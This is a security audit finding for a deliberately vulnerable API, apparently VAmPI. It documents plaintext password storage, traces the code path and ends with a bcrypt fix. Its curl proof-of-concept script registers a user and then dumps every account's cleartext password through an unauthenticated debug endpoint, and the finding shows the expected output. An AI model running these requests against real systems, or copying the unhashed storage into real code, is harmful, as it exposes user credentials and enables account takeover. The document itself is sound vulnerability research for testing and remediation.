# H4: Plaintext Password Storage — PoC

**ID**: H4  
**Severity**: High  
**PoC-Status**: theoretical  
**Component**: `models/user_model.py`, `api_views/users.py`

---

## Vulnerability

Passwords are assigned directly to the ORM model with no hashing step. Every password written to the SQLite `users` table lands as a cleartext string. The debug endpoint then serves that table — including the `password` column — to any unauthenticated caller.

---

## Code Path (registration to storage)

```
POST /users/v1/register
  -> api_views/users.py:68
       user = User(username=..., password=request_data['password'], ...)
  -> models/user_model.py:24
       self.password = password          # no hash, no salt
  -> db.session.commit()                 # persisted to SQLite as plaintext
```

Login comparison (api_views/users.py:93) confirms the same:

```python
if user and request_data.get('password') == user.password:   # direct string compare
```

There is no import of bcrypt, argon2, hashlib, or any crypto primitive anywhere in the models layer.

---

## Exploit Path: Debug Endpoint Leaks All Plaintext Passwords

`GET /users/v1/admin/debug` is routed to `api_views/users.py:debug()`, which calls `User.get_all_users_debug()`. That method calls `json_debug()` on every row:

```python
# models/user_model.py:58-59
def json_debug(self):
    return {'username': self.username, 'password': self.password,
            'email': self.email, 'admin': self.admin}
```

The route requires no authentication. A single unauthenticated HTTP request dumps every account's cleartext password.

---

## PoC Script

```bash
#!/usr/bin/env bash
# poc.sh — H4 Plaintext Password Storage
# Prerequisites: VAmPI running on localhost:5000

BASE="http://localhost:5000"

# Step 1: register a victim user
curl -s -X POST "$BASE/users/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":"S3cr3tP@ss","email":"victim@example.com"}' \
  | python3 -m json.tool

# Step 2: unauthenticated dump of all plaintext passwords
echo ""
echo "[*] Dumping all plaintext passwords via debug endpoint:"
curl -s "$BASE/users/v1/admin/debug" | python3 -m json.tool
```

**Expected response from Step 2 (abridged):**

```json
{
  "users": [
    {"username": "name1",  "password": "pass1",       "email": "mail1@mail.com", "admin": false},
    {"username": "name2",  "password": "pass2",       "email": "mail2@mail.com", "admin": false},
    {"username": "admin",  "password": "pass1",       "email": "admin@mail.com", "admin": true},
    {"username": "victim", "password": "S3cr3tP@ss",  "email": "victim@example.com", "admin": false}
  ]
}
```

The admin account's password is exposed alongside every other user. An attacker with the admin password can then authenticate to privileged endpoints.

---

## Impact

| Step | Attacker gain |
|------|---------------|
| Register or assume any user exists | Baseline — no privilege needed |
| `GET /users/v1/admin/debug` (no auth) | Full credential dump: username + plaintext password for every account |
| Login as `admin` with recovered password | Admin-level API access |
| Database file read (e.g. via path traversal or backup) | Same result — passwords readable directly from `vampi.db` |

Credential reuse across services amplifies the impact beyond this application.

---

## Root Cause

`models/user_model.py:24` — `self.password = password` with no intermediate hashing. Fix: apply a one-way adaptive hash (bcrypt / argon2) at write time and compare with `checkpw()` at login.

```python
# Minimal fix
from bcrypt import hashpw, gensalt, checkpw

# registration
self.password = hashpw(password.encode(), gensalt()).decode()

# login (api_views/users.py:93)
if user and checkpw(request_data['password'].encode(), user.password.encode()):
```
